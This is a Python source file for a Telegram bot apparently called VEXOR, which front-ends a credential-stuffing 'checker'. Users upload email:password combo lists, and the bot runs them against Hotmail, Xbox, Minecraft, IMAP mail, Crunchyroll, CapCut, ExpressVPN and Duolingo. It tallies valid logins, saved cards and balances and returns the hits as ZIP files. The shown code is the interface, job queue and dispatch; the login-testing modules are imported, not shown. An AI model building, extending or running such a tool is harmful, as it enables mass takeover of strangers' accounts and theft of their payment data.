"""Telegram API + UI + handlers + multi-file job queue — VEXOR Mk2 (Clean & Fixed)."""
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
import os
from pathlib import Path
import shutil
import signal
import tempfile
import threading
import time
import traceback

import admin
import config
from config import (
    BASE_DIR,
    save_emergency_backup,
    CheckJob,
    build_zip_chunks,
    bump_user_stats,
    clear_job_state,
    esc_html,
    gen_session_id,
    get_user_stats,
    is_allowed,
    list_allowed,
    list_banned,
    load_all_queues,
    load_combos,
    load_job_states,
    log,
    prune_rate_times,
    rate_ok,
    safe_extract_zip,
    save_job_state,
    save_user_queue,
    start_health_server,
    verify_proxy_sample,
)
from crunchyroll import run as run_crunchyroll
from duolingo import run as run_duolingo
from express import run as run_express
from capcut import run as run_capcut
from hotmail import run as run_hotmail
from mixmail import run as run_imap
import requests
from xbox import run as run_xbox

_api_sem = threading.BoundedSemaphore(config.API_RATE_SEM)

# Fast navigation callbacks — no ⏳ popup
_FAST_CALLBACKS = frozenset({
    "menu_home",
    "menu_upload",
    "menu_stats",
    "menu_help",
    "menu_cancel",
    "mode_cancel",
    "submenu_hotmail",
    "submenu_back",
    "queue_clear",
})


# ═══════════════ PREMIUM EMOJI & STYLE ═══════════════
_P: dict = {
    # ── Results ──────────────────────────────────────────────────────────────
    "✅": "5920052658743283381",  # SUCCESS
    "❌": "5258226313285607065",  # X / Cancel
    "⚠️": "5258474669769497337",  # WARNING
    "🔐": "5258476306152038031",  # LOCK (2FA)
    "🔑": "6005570495603282482",  # Key
    "🌐": "5447410659077661506",  # Globe / Net error
    # ── Speed / Power ────────────────────────────────────────────────────────
    "🔥": "5424972470023104089",  # Fire
    "⚡": "5843553939672274145",  # Lightning (CPM)
    "💎": "5807465992363710697",  # Diamond
    "⭐": "5874948844935974490",  # Star
    "✨": "5877318502947229960",  # Sparkles
    "🚀": "5134457377428341766",  # Rocket
    "🏆": "5961051261204696786",  # Trophy
    "🎯": "5974235702701853774",  # Target
    # ── Navigation / UI ──────────────────────────────────────────────────────
    "🏠": "5807868868886009920",  # Home
    "🔄": "5260687119092817530",  # Refresh
    "⚙️": "5258420634785947640",  # Settings
    "🔍": "5260341314095947411",  # Search
    "📌": "5447187153274567373",  # Pin
    "🔗": "5447479640547428304",  # Link
    "💡": "5301275719681190738",  # Idea / Tip
    # ── Users ────────────────────────────────────────────────────────────────
    "👤": "5771887475421090729",  # Profile
    "👥": "5258513401784573443",  # Users / Community
    "🤖": "5258093637450866522",  # Robot
    "🤵": "4949560993840629085",  # Admin
    "👑": "5229011542011299168",  # Crown
    # ── Finance / Cards ──────────────────────────────────────────────────────
    "💳": "5258260149037965799",  # Card
    "💰": "5987880246865565644",  # Money bag
    "🪙": "5258368777350816286",  # Coin
    # ── Progress / Files ─────────────────────────────────────────────────────
    "📊": "5884161133174067365",  # Stats / Chart
    "📈": "5776219138917668486",  # Chart Up
    "📦": "5303102515301083665",  # Package / Box
    "📁": "5875206779196935950",  # Folder
    "📄": "5258477770735885832",  # Document
    "📝": "5839380464116175529",  # Edit / Note
    "📋": "4904936030232117798",  # Clipboard
    "📤": "5260652420052032852",  # Outbox / Upload
    # ── Time ─────────────────────────────────────────────────────────────────
    "⏱": "5343927661213279013",  # Stopwatch
    "⏳": "5258113901106580375",  # Hourglass
    "⏰": "5985616167740379273",  # Clock
    # ── Controls ─────────────────────────────────────────────────────────────
    "🛑": "5420323339723881652",  # Stop sign
    "🔙": "5877536313623711363",  # Back arrow
    # ── Tech / Misc ──────────────────────────────────────────────────────────
    "📢": "5116445341150872576",  # Broadcast
    "📡": "5447448489149625830",  # Satellite / API
    "📧": "5796683820564484775",  # Email / Hotmail
    "✉️": "5967280668885913944",  # Envelope
    "🎉": "6033099457854182147",  # Celebrate
    "🛡": "5796153709931009517",  # ExpressVPN
    "🦉": "5796371348808799072",  # Duolingo
    "💥": "5122933683820430249",  # Boom
    "🔹": "5429436388447655367",  # Blue small diamond
    "🔷": "5226656353744862682",  # Blue large diamond
    "🌟": "5310224206732996002",  # Glowing star
    "💠": "5343636681473935403",  # Diamond with dot
    # ── Checkers & Platforms ─────────────────────────────────────────────────
    "🎮": "5298970683747867910",  # Xbox logo
    "🕹️": "5814479472094612906",  # Console
    "🧩": "5814426016931647060",  # Game Pass
    "⛏": "5359457966602854567",  # Minecraft
    "🎬": "5032971792759655106",  # Crunchyroll
    "✂️": "6008121985349979345",  # CapCut
    "💻": "5967816500415827773",  # Laptop
    "🎁": "5875180111744995604",  # Gift box
    "🚪": "5877341274863832725",  # Door
    "⬇️": "5258336354642697821",  # Download
    "⬆️": "5260652420052032852",  # Upload
}


def pe(c: str) -> str:
  """Return <tg-emoji> tag for HTML parse_mode, or plain char if no ID."""
  eid = _P.get(c)
  return f'<tg-emoji emoji-id="{eid}">{c}</tg-emoji>' if eid else c


# Build bold mathematical unicode map once at import
_BOLD: dict = {}
for _i in range(26):
  _BOLD[chr(65 + _i)] = chr(0x1D400 + _i)  # A-Z → 𝐀-𝐙
  _BOLD[chr(97 + _i)] = chr(0x1D41A + _i)  # a-z → 𝐚-𝐳
for _i in range(10):
  _BOLD[chr(48 + _i)] = chr(0x1D7CE + _i)  # 0-9 → 𝟎-𝟗


def sexy(t: str) -> str:
  """Convert ASCII to bold serif unicode — looks bold/stylish in Telegram buttons."""
  return "".join(_BOLD.get(c, c) for c in t)


def mode_emoji(mode: str) -> str:
  """Return emoji character for a given mode."""
  emoji_map = {
      "hotmail": "📧",
      "inbox": "📦",
      "full": "🔥",
      "xbox": "🎮",
      "minecraft": "⛏",
      "imap": "✉️",
      "crunchyroll": "🎬",
      "capcut": "✂️",
      "cupcut": "✂️",
      "express": "🛡",
      "duolingo": "🦉",
  }
  return emoji_map.get(mode, "🎯")


_SPIN = ("●", "◉", "○", "◎", "●", "◈")


# ═══════════════════ TELEGRAM API ═══════════════════
class TelegramAPI:

  def __init__(self, token):
    self.token = token
    self.api = f"https://api.telegram.org/bot{token}"
    self.file_api = f"https://api.telegram.org/file/bot{token}"

  def post(self, method, retry=True, **kwargs):
    attempts = 3 if retry else 1
    for attempt in range(attempts):
      retry_after = 0
      _api_sem.acquire()
      try:
        r = requests.post(f"{self.api}/{method}", timeout=35, **kwargs)
        data = r.json()
        if not data.get("ok"):
          if data.get("error_code") == 429:
            retry_after = int(data.get("parameters", {}).get("retry_after", 3))
            log("api", f"{method} hit 429 rate limit — waiting {retry_after}s", level="WARN")
          else:
            desc = data.get("description", "")[:200]
            desc_lc = desc.lower()
            if (
                "message is not modified" not in desc_lc
                and "query is too old" not in desc_lc
            ):
              log("api", f"{method} failed: {desc}", level="WARN")
            return data
        else:
          return data
      except Exception as e:
        log(
            "api",
            f"{method} attempt {attempt+1}: {type(e).__name__}",
            level="ERROR",
        )
        if attempt < attempts - 1:
          retry_after = 1
      finally:
        time.sleep(0.04)
        _api_sem.release()
      if retry_after > 0 and attempt < attempts - 1:
        time.sleep(min(retry_after, 30))
    return {}

  def send_rich(self, chat_id, html_content, reply_markup=None):
    payload = {
        "chat_id": chat_id,
        "text": html_content,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if reply_markup:
      payload["reply_markup"] = reply_markup
    return self.post("sendMessage", retry=True, json=payload)

  def edit_rich(self, chat_id, message_id, html_content, reply_markup=None):
    if not message_id:
      return self.send_rich(chat_id, html_content, reply_markup)
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": html_content,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if reply_markup:
      payload["reply_markup"] = reply_markup
    return self.post("editMessageText", json=payload)

  def send_zip(self, chat_id, buf, filename="checker.zip", caption=""):
    buf.seek(0)
    _api_sem.acquire()
    try:
      r = requests.post(
          f"{self.api}/sendDocument",
          data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
          files={"document": (filename, buf, "application/zip")},
          timeout=90,
      )
      return r.json()
    except Exception as e:
      log("bot", f"send_zip: {e}", level="ERROR")
      return {}
    finally:
      time.sleep(0.04)
      _api_sem.release()

  def get_updates(self, offset):
    try:
      r = requests.get(
          f"{self.api}/getUpdates",
          params={"offset": offset, "timeout": 20},
          timeout=25,
      )
      return r.json().get("result", [])
    except Exception:
      return None

  def download(self, file_id, save_path):
    _api_sem.acquire()
    try:
      r = requests.get(
          f"{self.api}/getFile", params={"file_id": file_id}, timeout=15
      ).json()
      fp = r["result"]["file_path"]
    except Exception as e:
      log("bot", f"download getFile: {e}", level="ERROR")
      return False
    finally:
      time.sleep(0.04)
      _api_sem.release()
    try:
      r2 = requests.get(f"{self.file_api}/{fp}", timeout=60)
      with open(save_path, "wb") as f:
        f.write(r2.content)
      return True
    except Exception as e:
      log("bot", f"download file: {e}", level="ERROR")
      return False

  def answer_callback(self, cb_id, text=None, alert=False):
    payload = {"callback_query_id": cb_id}
    if text:
      payload["text"] = text
      payload["show_alert"] = alert
    try:
      self.post("answerCallbackQuery", retry=False, json=payload)
    except Exception:
      pass

  def clear_reply_keyboard(self, chat_id):
    try:
      r = self.post(
          "sendMessage",
          retry=False,
          json={
              "chat_id": chat_id,
              "text": ".",
              "reply_markup": {"remove_keyboard": True, "selective": False},
          },
      )
      mid = r.get("result", {}).get("message_id")
      if mid:
        self.post(
            "deleteMessage",
            retry=False,
            json={"chat_id": chat_id, "message_id": mid},
        )
    except Exception:
      pass


# ═══════════════════ UI — KEYBOARDS ═══════════════════
def _btn(text, callback_data=None, icon: str = None):
  b = {"text": text}
  if callback_data:
    b["callback_data"] = callback_data[:64]
  if icon:
    eid = _P.get(icon)
    if eid:
      b["icon_custom_emoji_id"] = eid
  return b


def main_menu_kb(show_cancel=False, has_queue=False):
  rows = [
      [_btn(sexy("Stats"), "menu_stats", "📊"),
       _btn(sexy("Help"), "menu_help", "💡")],
      [_btn(sexy("Upload Combos"), "menu_upload", "🚀")],
  ]
  if show_cancel:
    rows.append([_btn(sexy("Cancel Job"), "menu_cancel", "🛑")])
  if has_queue:
    rows.append([_btn(sexy("Clear Queue"), "queue_clear", "❌")])
  return {"inline_keyboard": rows}


def sub_menu_kb():
  return {
      "inline_keyboard": [
          [
              _btn(sexy("Upload"), "menu_upload", "🚀"),
              _btn(sexy("Home"), "menu_home", "🏠"),
          ],
      ]
  }


def mode_select_kb(bid: str = None):
  """Main mode selection: HOTMAIL, MIX MAIL, CRUNCHYROLL, CAPCUT."""
  sfx = f":{bid}" if bid else ""
  return {
      "inline_keyboard": [
          [_btn(sexy("HOTMAIL"), f"submenu_hotmail{sfx}", "🔥")],
          [_btn(sexy("MIX MAIL"), f"mode_imap{sfx}", "✉️")],
          [_btn(sexy("CRUNCHYROLL"), f"mode_crunchyroll{sfx}", "🎬")],
          [_btn(sexy("CAPCUT"), f"mode_capcut{sfx}", "✂️")],
          [_btn(sexy("EXPRESS VPN"), f"mode_express{sfx}", "🛡")],
          [_btn(sexy("DUOLINGO"), f"mode_duolingo{sfx}", "🦉")],
          [_btn(sexy("Cancel"), f"mode_cancel{sfx}", "❌")],
      ]
  }


def hotmail_submenu_kb(bid: str = None):
  """Hotmail submenu with all 5 check modes."""
  sfx = f":{bid}" if bid else ""
  return {
      "inline_keyboard": [
          [
              _btn(sexy("Hotmail Only"), f"mode_hotmail{sfx}", "📧"),
              _btn(sexy("Hotmail + Inbox"), f"mode_inbox{sfx}", "📦"),
          ],
          [
              _btn(sexy("Xbox"), f"mode_xbox{sfx}", "🎮"),
              _btn(sexy("Minecraft"), f"mode_minecraft{sfx}", "⛏"),
          ],
          [_btn(sexy("Full Check"), f"mode_full{sfx}", "🔥")],
          [_btn(sexy("Back"), f"submenu_back{sfx}", "🔙")],
      ]
  }


def job_status_kb(has_queue=False):
  rows = [[_btn(sexy("Stop Current"), "menu_cancel", "🛑")]]
  if has_queue:
    rows.append([_btn(sexy("Clear Queue"), "queue_clear", "❌")])
  return {"inline_keyboard": rows}


def admin_menu_kb():
  return {
      "inline_keyboard": [
          [
              _btn(sexy("Statistics"), "admin_stats", "📊"),
              _btn(sexy("Active Jobs"), "admin_jobs", "🔄"),
          ],
          [
              _btn(sexy("Users"), "admin_users", "👥"),
              _btn(sexy("Stop All"), "admin_stopall", "🛑"),
          ],
          [
              _btn(sexy("Debug Logs"), "admin_logs", "📁"),
              _btn(sexy("Proxies"), "admin_proxies", "📡"),
          ],
          [
              _btn(sexy("Broadcast"), "admin_broadcast", "📢"),
              _btn(sexy("Home"), "menu_home", "🏠"),
          ],
      ]
  }


# ═══════════════════ UI — TEXT ═══════════════════
def welcome_html(name, is_admin=False):
  cfg_line = ""
  if is_admin:
    cfg_line = (
        f"\n{pe('⚙️')} Config › "
        f"<code>{config.THREADS}t</code> login · "
        f"<code>{config.IMAP_THREADS}t</code> IMAP · "
        f"<code>{config.XBOX_THREADS}t</code> Xbox\n"
        f"{pe('👥')} Users: <code>{len(list_allowed())}</code>"
    )
  return (
      f"{pe('🤖')} <b>VEXOR CHECKER</b>\n"
      f"<pre>multi checker • v2</pre>\n\n"
      f"<blockquote>"
      f"{pe('👤')} User: <b>{esc_html(name)}</b>{cfg_line}\n"
      f"{pe('⚙️')} Modes: Hotmail · Inbox · Full · Xbox · MC · Mix · Crunchyroll · CapCut · ExpressVPN · Duolingo\n"
      f"{pe('📝')} Format: <code>email:password</code>\n"
      f"{pe('📦')} Multi-File Queue: <b>Enabled</b>"
      f"</blockquote>\n\n"
      f"{pe('🚀')} <b>Drop one or multiple combo files to begin</b>"
  )


def help_html():
  return (
      f"{pe('💡')} <b>VEXOR — How to use</b>\n"
      f"<pre>usage guide • vexor</pre>\n\n"
      f"<blockquote>"
      f"{pe('📝')} Prepare one or more <code>.txt</code> or <code>.zip</code> files\n"
      f"{pe('📝')} Each line: <code>email:password</code> (or <code>|</code> / <code>;</code>)\n"
      f"{pe('📝')} Send files anytime {pe('🚀')} pick a mode for each file\n"
      f"{pe('⏳')} If a scan is already running, new files are queued and start automatically!"
      f"</blockquote>\n\n"
      f"{pe('🔥')} <b>Modes:</b>\n"
      f"<blockquote>"
      f"{pe('📧')} <b>HOTMAIL</b> — Login, Inbox, Xbox, Minecraft, or Full check\n"
      f"{pe('✉️')} <b>MIX MAIL</b> — IMAP any provider (Gmail, Yahoo, etc)\n"
      f"{pe('🎬')} <b>CRUNCHYROLL</b> — Crunchyroll streaming accounts\n"
      f"{pe('✂️')} <b>CAPCUT</b> — CapCut Pro video editor accounts"
      f"</blockquote>\n\n"
      f"{pe('🛑')} <code>/cancel</code> — stop active job\n"
      f"{pe('📋')} <code>/queue</code> — view or clear queued files\n"
      f"{pe('📊')} <code>/status</code> — current job status"
  )


def mode_prompt_html(n_combos, junk, dup, preview, file_label="combos.txt", is_busy=False):
  preview_block = ""
  if preview:
    preview_block = "\n".join(preview) + "\n\n"
  total = n_combos + junk + dup
  warn_emoji = pe("⚠️")
  queue_note = (
      f"\n{pe('⏳')} <i>Note: A check is active — choosing a mode will queue this file automatically.</i>\n"
      if is_busy
      else ""
  )
  return (
      f"{pe('🤖')} <b>VEXOR CHECKER</b>\n"
      f"<pre>file received • ready to scan</pre>\n\n"
      f"<blockquote>"
      f"{pe('📄')} File    › <code>{esc_html(file_label)}</code>\n"
      f"{pe('📦')} Lines   › <code>{total}</code>\n"
      f"{pe('✅')} Combos  › <code>{n_combos}</code>\n"
      f"{warn_emoji} Junk    › <code>{junk}</code>\n"
      f"{pe('🔄')} Dupes   › <code>{dup}</code>"
      f"</blockquote>\n"
      f"{queue_note}\n"
      f"{preview_block}"
      f"{pe('🔥')} <b>Choose a scan mode:</b>"
  )


def _mask_pw(pw):
  if not pw:
    return "***"
  return pw[0] + "*" * max(1, len(pw) - 1)


def job_status_html(job, queued_count=0):
  with job.lock:
    done = job.processed
    pct = int(done * 100 / job.total) if job.total else 0
    elapsed = max(
        1, int(time.time() - job.start_time) + job.elapsed_before_pause
    )
    cpm = int(done * 60 / elapsed) if elapsed else 0
    remaining = max(0, job.total - done)

    filled = int(20 * pct / 100)
    bar = "█" * filled + "░" * (20 - filled)

    mins, secs = divmod(elapsed, 60)
    elapsed_str = f"{mins:02d}:{secs:02d}"

    if done == 0:
      eta_str = "..."
    else:
      eta_sec = int(remaining * elapsed / done)
      if eta_sec >= 3600:
        eta_str = f"{eta_sec // 3600}h {(eta_sec % 3600) // 60}m"
      elif eta_sec >= 60:
        eta_str = f"{eta_sec // 60}m {eta_sec % 60}s"
      else:
        eta_str = f"{eta_sec}s"

    spin = _SPIN[int(time.time() * 4) % len(_SPIN)]
    resume_line = f"{pe('🔄')} <i>Resumed</i>\n" if job.resumed else ""
    file_line = (
        f"{pe('📄')} File: <code>{esc_html(job.file_label)}</code>\n"
        if getattr(job, "file_label", "")
        else ""
    )
    queue_line = (
        f"{pe('📋')} Queued Next: <b>{queued_count} file(s)</b>\n"
        if queued_count > 0
        else ""
    )

    extracting_line = (
        f"{pe('🔄')} Extracting › <code>{job.extracting}</code>\n"
        if job.extracting > 0
        else ""
    )

    extra = ""
    if job.mode in ("inbox", "imap") and job.valid > 0:
      extra = f"{pe('📦')} Extracted › <code>{job.extracted}</code>\n"
    elif job.mode == "full" and job.valid > 0:
      extra = (
          f"{pe('📦')} Extracted › <code>{job.extracted}</code>  "
          f"{pe('🎮')} GP › <code>{job.gamepass}</code>  "
          f"{pe('⛏')} MC › <code>{job.minecraft}</code>\n"
      )
    elif job.mode == "xbox" and job.valid > 0:
      extra = (
          f"{pe('🎮')} GamePass › <code>{job.gamepass}</code>  "
          f"{pe('⛏')} MC › <code>{job.minecraft}</code>\n"
          f"{pe('💳')} CC › <code>{job.with_cards}</code>  "
          f"{pe('💰')} Bal › <code>{job.with_balance}</code>\n"
      )
    elif job.mode == "minecraft" and job.valid > 0:
      extra = f"{pe('⛏')} Minecraft › <code>{job.minecraft}</code>\n"
    elif job.mode in ("crunchyroll", "capcut", "cupcut", "express", "duolingo") and (
        job.free > 0 or job.throttled > 0
    ):
      parts = []
      if job.free > 0:
        parts.append(f"{pe('📦')} Free › <code>{job.free}</code>")
      if job.throttled > 0:
        parts.append(f"{pe('⏳')} Rate › <code>{job.throttled}</code>")
      extra = "  ".join(parts) + "\n"

    imap_extra = ""
    if job.mode == "imap":
      lk = getattr(job, "imap_locked", 0)
      ex = getattr(job, "imap_expired", 0)
      rl = getattr(job, "imap_rate_limited", 0)
      if lk or ex or rl:
        imap_extra = (
            f"{pe('🔐')} Locked › <code>{lk}</code>  "
            f"{pe('⏳')} Exp › <code>{ex}</code>  "
            f"{pe('🌐')} Rate › <code>{rl}</code>\n"
        )

    unclear_line = (
        f"{pe('⚠️')} Unclear › <code>{job.unclear}</code>\n"
        if job.unclear
        else ""
    )
    retry_line = (
        f"{pe('🔄')} Retried › <code>{job.retried}</code>  "
        f"Rec › <code>{job.recovered}</code>\n"
        if job.retried > 0
        else ""
    )
    finish_line = ""
    if (
        remaining <= config.TAIL_REMAINING
        and job.total >= config.TAIL_MIN_BATCH
        and remaining > 0
    ):
      finish_line = f"\n{pe('🏆')} <i>Last {remaining} combos…</i>"

    return (
        f"{spin} <b>VEXOR CHECKER</b> {pe('🔄')}\n"
        f"<pre>vexor • live scan</pre>\n"
        f"{resume_line}"
        f"{extracting_line}"
        f"{file_line}"
        f"{pe('🎯')} Mode: <b>{job.mode_label}</b>\n"
        f"{queue_line}"
        f"{pe('📦')} Progress: <code>[{bar}] {pct}%</code>\n"
        f"<code>{done}/{job.total}</code>  |  "
        f"{pe('⏳')} <code>{elapsed_str}</code>  |  "
        f"{pe('⚡')} <code>{cpm} CPM</code> {pe('🔥')}\n\n"
        f"<blockquote>"
        f"{pe('✅')} VALID: <b>{job.valid}</b>     "
        f"{pe('🔐')} 2FA: <code>{job.twofa}</code>\n"
        f"{pe('❌')} BAD: <code>{job.bad}</code>     "
        f"{pe('🌐')} ERR: <code>{job.net}</code>\n"
        f"{unclear_line}"
        f"{extra}"
        f"{imap_extra}"
        f"{retry_line}"
        f"</blockquote>\n"
        f"{pe('⏱')} ETA: <code>{eta_str}</code>"
        f"{finish_line}"
    )


def job_final_html(job, elapsed=None):
  if elapsed is None:
    elapsed = (
        int((job.end_time or time.time()) - job.start_time)
        + job.elapsed_before_pause
    )
  with job.lock:
    hit_rate = f"{job.valid * 100 / job.total:.1f}%" if job.total else "0%"
    elapsed_s = max(1, elapsed)
    cpm = int(job.processed * 60 / elapsed_s)
    mins, secs = divmod(elapsed, 60)

    inbox_line = ""
    if job.mode in ("inbox", "imap"):
      inbox_line = f"{pe('📦')} Extracted: <code>{job.extracted}</code>\n"
    elif job.mode == "full":
      inbox_line = (
          f"{pe('📦')} Extracted: <code>{job.extracted}</code>  "
          f"{pe('🎮')} GP: <code>{job.gamepass}</code>  "
          f"{pe('⛏')} MC: <code>{job.minecraft}</code>\n"
      )
    elif job.mode == "xbox":
      inbox_line = (
          f"{pe('🎮')} GP: <code>{job.gamepass}</code>  "
          f"{pe('⛏')} MC: <code>{job.minecraft}</code>  "
          f"{pe('💳')} CC: <code>{job.with_cards}</code>  "
          f"{pe('💰')} Bal: <code>{job.with_balance}</code>\n"
      )
    elif job.mode == "minecraft":
      inbox_line = f"{pe('⛏')} Minecraft: <code>{job.minecraft}</code>\n"
    elif job.mode in ("crunchyroll", "capcut", "cupcut", "express", "duolingo") and (
        job.free > 0 or job.throttled > 0
    ):
      parts = []
      if job.free > 0:
        parts.append(f"{pe('📦')} Free: <code>{job.free}</code>")
      if job.throttled > 0:
        parts.append(f"{pe('⏳')} Throttled: <code>{job.throttled}</code>")
      inbox_line = "  ".join(parts) + "\n"

    imap_line = ""
    if job.mode == "imap":
      locked = getattr(job, "imap_locked", 0)
      expired = getattr(job, "imap_expired", 0)
      rate = getattr(job, "imap_rate_limited", 0)
      if locked or expired or rate:
        imap_line = (
            f"{pe('🔐')} Locked: <code>{locked}</code>  "
            f"{pe('⏳')} Exp: <code>{expired}</code>  "
            f"{pe('🌐')} Rate: <code>{rate}</code>\n"
        )

    unclear_line = (
        f"{pe('⚠️')} Unclear: <code>{job.unclear}</code>\n"
        if job.unclear
        else ""
    )
    retry_line = (
        f"{pe('🔄')} Retried: <code>{job.retried}</code>  "
        f"Rec: <code>{job.recovered}</code>\n"
        if job.retried > 0
        else ""
    )
    skip_line = (
        f"{pe('⚡')} Skip: <code>{job.skip}</code>\n" if job.skip else ""
    )
    file_line = (
        f"{pe('📄')} File: <code>{esc_html(job.file_label)}</code>\n"
        if getattr(job, "file_label", "")
        else ""
    )

    return (
        f"{pe('🏆')} <b>CHECK COMPLETE</b>\n"
        f"<pre>vexor • results</pre>\n\n"
        f"{file_line}"
        f"{pe(mode_emoji(job.mode))} Mode: {job.mode_label}\n\n"
        f"<blockquote>"
        f"{pe('✅')} Valid:    <b>{job.valid}</b>\n"
        f"{inbox_line}"
        f"{pe('🔐')} 2FA:     <code>{job.twofa}</code>\n"
        f"{pe('❌')} Bad:     <code>{job.bad}</code>\n"
        f"{unclear_line}"
        f"{imap_line}"
        f"{skip_line}"
        f"{pe('🌐')} Net Fail: <code>{job.net}</code>\n"
        f"{retry_line}"
        f"</blockquote>\n"
        f"{pe('📈')} Hit Rate: <code>{hit_rate}</code>  "
        f"{pe('⚡')} Speed: <code>{cpm}/min</code>  "
        f"{pe('⏱')} Time: <code>{mins:02d}:{secs:02d}</code>"
    )


def _build_agg_line(chat_id):
  agg = get_user_stats(chat_id)
  return (
      f"{pe('📈')} <b>All-time Stats</b>\n"
      f"Jobs: <code>{agg['jobs']}</code>  "
      f"Valid: <code>{agg['valid']}</code>  "
      f"Combos: <code>{agg['combos']}</code>\n\n"
  )


# ═══════════════════ JOB RUNNER & AUTO-QUEUE DISPATCH ═══════════════════
def _get_queued_count(bot, chat_id):
  with bot.queue_lock:
    return len(bot.job_queues.get(chat_id, []))


def _make_status_reporter(bot, job):
  lock = threading.Lock()
  last = {"time": 0.0, "text": "", "state": 0.0}

  def reporter(force=False):
    with lock:
      now = time.time()
      if now - last["state"] > config.JOB_STATE_INTERVAL:
        last["state"] = now
        try:
          save_job_state(job)
        except Exception as e:
          log("state", f"save: {e}", level="WARN")
      if not force and now - last["time"] < config.STATUS_UPDATE_INTERVAL:
        return
      q_cnt = _get_queued_count(bot, job.chat_id)
      html = job_status_html(job, queued_count=q_cnt)
      if html == last["text"]:
        return
      last["time"] = now
      last["text"] = html
    try:
      bot.api.edit_rich(
          job.chat_id,
          job.status_msg_id,
          html,
          job_status_kb(has_queue=(q_cnt > 0)),
      )
    except Exception as e:
      log("check", f"update_status: {e}", level="WARN")

  return reporter


def _run_job(bot, job):
  try:
    reporter = _make_status_reporter(bot, job)
    q_cnt = _get_queued_count(bot, job.chat_id)
    init = job_status_html(job, queued_count=q_cnt)
    r = bot.api.edit_rich(
        job.chat_id,
        job.status_msg_id,
        init,
        job_status_kb(has_queue=(q_cnt > 0)),
    )
    if not r.get("ok"):
      r2 = bot.api.send_rich(
          job.chat_id, init, job_status_kb(has_queue=(q_cnt > 0))
      )
      new_id = r2.get("result", {}).get("message_id")
      if new_id:
        job.status_msg_id = new_id

    if job.imap_mode:
      run_imap(job, reporter)
    elif job.xbox_mode or job.minecraft_mode:
      run_xbox(job, reporter)
    elif job.mode == "crunchyroll":
      run_crunchyroll(job, reporter)
    elif job.mode in ("capcut", "cupcut"):
      run_capcut(job, reporter)
    elif job.mode == "express":
      run_express(job, reporter)
    elif job.mode == "duolingo":
      run_duolingo(job, reporter)
    else:
      run_hotmail(job, reporter)

  except Exception as e:
    log("check", f"{job.chat_id} checker crashed: {e}", level="ERROR")
    _notify_admin_error(bot, job, traceback.format_exc())
    try:
      bot.api.send_rich(
          job.chat_id,
          f"{pe('⚠️')} <b>Checker error (saving partial hits):</b>\n<code>{esc_html(str(e)[:200])}</code>",
      )
    except Exception:
      pass

  # Always finalize and send any collected hits even if the checker had an exception!
  try:
    save_emergency_backup(job)
    _finalize_job(bot, job)
  except Exception as fin_err:
    log("check", f"{job.chat_id} finalize error: {fin_err}", level="ERROR")
    _notify_admin_error(bot, job, traceback.format_exc())
  finally:
    with bot.active_lock:
      bot.last_jobs[job.chat_id] = job
      bot.active.pop(job.chat_id, None)
    _prune_last_jobs(bot)
    # Automatically trigger the next queued file for this user if one exists!
    _pop_and_start_next_queued_job(bot, job.chat_id)


def _pop_and_start_next_queued_job(bot, chat_id):
  """Check if the user has queued files waiting and launch the next one automatically."""
  with bot.queue_lock:
    q = bot.job_queues.get(chat_id, [])
    if not q:
      return
    next_item = q.pop(0)
    save_user_queue(chat_id, q)
    remaining_in_q = len(q)

  combos = next_item["combos"]
  junk = next_item.get("junk", 0)
  dup = next_item.get("dup", 0)
  mode = next_item.get("mode", "hotmail")
  file_label = next_item.get("file_label", "combos.txt")

  log(
      "queue",
      f"Auto-starting queued file '{file_label}' ({len(combos)} combos, mode={mode}) "
      f"for chat={chat_id} ({remaining_in_q} still in queue)",
      level="INFO",
  )

  resp = bot.api.send_rich(
      chat_id,
      f"{pe('🚀')} <b>Auto-starting next queued file!</b>\n"
      f"{pe('📄')} File: <code>{esc_html(file_label)}</code>\n"
      f"{pe('🎯')} Mode: <b>{config.MODE_LABELS.get(mode, mode)}</b>\n"
      f"{pe('📋')} Remaining in queue: <code>{remaining_in_q}</code>",
  )
  status_mid = resp.get("result", {}).get("message_id")
  start_or_queue_check(
      bot,
      chat_id,
      combos,
      junk,
      dup,
      status_mid,
      mode=mode,
      file_label=file_label,
  )


def _prune_last_jobs(bot):
  now = time.time()
  with bot.active_lock:
    for cid in list(bot.last_jobs.keys()):
      lj = bot.last_jobs.get(cid)
      if lj and lj.end_time and now - lj.end_time > config.LAST_JOB_RETENTION:
        bot.last_jobs.pop(cid, None)


def _finalize_job(bot, job):
  with job.lock:
    job.end_time = time.time()
    job.completed = True
  elapsed = int(job.end_time - job.start_time) + job.elapsed_before_pause

  clear_job_state(job.chat_id)
  bump_user_stats(job.chat_id, job.valid, job.total, mode=job.mode)

  bot.api.edit_rich(
      job.chat_id, job.status_msg_id, job_final_html(job, elapsed)
  )

  log(
      "CHECK",
      f"chat={job.chat_id} file={job.file_label} mode={job.mode} done in {elapsed}s | "
      f"valid={job.valid}/{job.total} | bad={job.bad} 2fa={job.twofa} "
      f"skip={job.skip} net={job.net} unclear={job.unclear} | "
      f"extracted={job.extracted} | gp={job.gamepass} mc={job.minecraft} "
      f"cc={job.with_cards} bal={job.with_balance} | "
      f"retried={job.retried} recovered={job.recovered}",
      level="DONE",
  )

  has_q = _get_queued_count(bot, job.chat_id) > 0

  if job.cancelled and not job.valid_list:
    bot.api.send_rich(
        job.chat_id,
        f"{pe('🛑')} <b>Job cancelled.</b>",
        main_menu_kb(has_queue=has_q),
    )
  elif job.valid_list or getattr(job, "free_list", None):
    try:
      chunks = build_zip_chunks(job.valid_list, job.mode, free_list=getattr(job, "free_list", None))
    except Exception as e:
      log("zip", f"build failed: {e}", "ERROR")
      bot.api.send_rich(
          job.chat_id,
          f"{pe('⚠️')} <b>Failed to build ZIP.</b>\n"
          f"{pe('✅')} Valid found: <code>{job.valid}</code>\n"
          "Contact admin.",
          main_menu_kb(has_queue=has_q),
      )
      _notify_admin_done(bot, job)
      with job.lock:
        job.valid_list.clear()
      return

    extra_notes = ""
    if job.mode in ("inbox", "imap", "full"):
      extra_notes += "\n  • <code>inbox/</code> — senders & domains"
    if job.mode in ("full", "xbox"):
      extra_notes += (
          "\n  • <code>gamepass/</code> — by tier"
          "\n  • <code>games/</code> — per-account"
          "\n  • <code>cards.txt</code>"
      )
    if job.mode == "minecraft":
      extra_notes += "\n  • <code>minecraft.txt</code>"
    if job.mode == "crunchyroll":
      extra_notes += (
          "\n  • <code>crunchyroll_hits.txt</code>"
          "\n  • <code>tiers/</code> — by subscription tier"
      )
